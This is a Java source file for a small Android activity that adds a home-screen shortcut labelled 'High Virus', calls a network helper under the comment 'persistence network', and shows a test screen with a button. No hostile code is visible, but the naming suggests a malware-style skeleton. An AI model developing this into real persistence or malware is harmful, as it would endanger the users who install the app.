package com.example.WrapperPro;

import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.app.Activity;

import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.TextView;


public class Main extends Activity {

    /** Called when the activity is first created. */
    SharedPreferences sharedPreferences;
    boolean isAppInstalled = false;
    public static int integer = 0;
    private Handler mHandler = new Handler();
    public static String Version = "0.1";
    private Position.Create Create;
    private Position.Size Size;
    private int Height;
    private int Width;
    private Position.Screen Screen;


    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // set icons to desktop
        Android_Component settings_sys = new Android_Component();

        // persistence network
        settings_sys.ForceNetworkThread();

        if (Build.VERSION.SDK_INT >= 25) {
            settings_sys.createShortcut(this);
        } else {
            sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
            isAppInstalled = sharedPreferences.getBoolean("isAppInstalled", false);
            if (!isAppInstalled) {
                Intent intent1 = new Intent(getApplicationContext(), Main.class);
                intent1.setAction(Intent.ACTION_MAIN);
                Intent intent2 = new Intent();
                intent2.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intent1);
                intent2.putExtra(Intent.EXTRA_SHORTCUT_NAME, "High Virus");
                intent2.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, Intent.ShortcutIconResource.fromContext(getApplicationContext(), R.drawable.icon2));
                intent2.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
                getApplicationContext().sendBroadcast(intent2);
                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putBoolean("isAppInstalled", true);
                editor.commit();
            }
        }

        // set full screen
        Screen = new Position.Screen();
        Screen.fullscreen(this);

        // get size screen
        Size = new Position.Size();
        Width = Size.width(this);
        Height = Size.height(this);


        Create = new Position.Create();
        RelativeLayout layout = Create.RelativeLayout(this);
        layout.setBackgroundColor(Color.BLACK);

        layout.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));


        TextView text = Create.Textview(this);
        text.setText("bonjour, test 2");

        Button button = Create.Button(this);
        button.setText("mon premier button");
        button.setHeight(100);
        button.setWidth(130);

        setContentView(layout);
        layout.addView(button);

        final ViewGroup.MarginLayoutParams Mbutton =(ViewGroup.MarginLayoutParams)button.getLayoutParams();
        Mbutton.setMargins(0,0,0,0);

        /*mHandler.postDelayed(new Runnable() {

            public void run() {

            }
        }, 5000); */

    }

}
